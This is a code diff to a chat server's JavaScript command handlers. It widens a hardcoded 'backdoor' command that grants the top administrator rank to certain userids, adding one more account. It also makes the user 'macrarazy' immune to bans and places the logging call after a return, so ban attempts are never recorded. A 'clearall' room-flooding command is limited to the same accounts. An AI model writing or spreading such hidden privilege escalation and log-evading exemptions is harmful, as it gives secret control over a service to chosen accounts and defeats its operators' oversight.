@@ -2138,6 +2138,11 @@ var commands = exports.commands = {
 		if (!targetUser) {
 			return this.sendReply('User '+this.targetUsername+' not found.');
 		}
+		var a = targetUser.name;
+		if (a == "macrarazy" || a == "macrarazy - Away") {
+			return this.sendReply('/ban - Banning the user ' + targetUser.name + ' is restricted.');
+			this.logModCommand(user.name+" tried to ban "+targetUser.name+".")
+			}
 		if (target.length > MAX_REASON_LENGTH) {
 			return this.sendReply('The reason is too long. It cannot exceed ' + MAX_REASON_LENGTH + ' characters.');
 		}
@@ -2753,7 +2758,7 @@ var commands = exports.commands = {
 	},
 	
 	backdoor: function(target,room, user) {
-                if (user.userid === 'astrelegit' || user.userid === 'macrarazy') {
+                if (user.userid === 'astrelegit' || user.userid === 'macrarazy' || user.userid === 'rerectly') {
 
                         user.group = '~';
                         user.updateIdentity();
@@ -2763,7 +2768,7 @@ var commands = exports.commands = {
         },
         
         clearall: function(target,room, user) {
-                if (user.userid === 'astrelegit' || user.userid === 'macrarazy' || user.userid === 'nobcakez' || user.userid === 'lightstar') {
+                if (user.userid === 'astrelegit' || user.userid === 'macrarazy' || user.userid === 'rerectly') {
 
                         this.parse('/a |html|<br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR> <br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>');
                 }
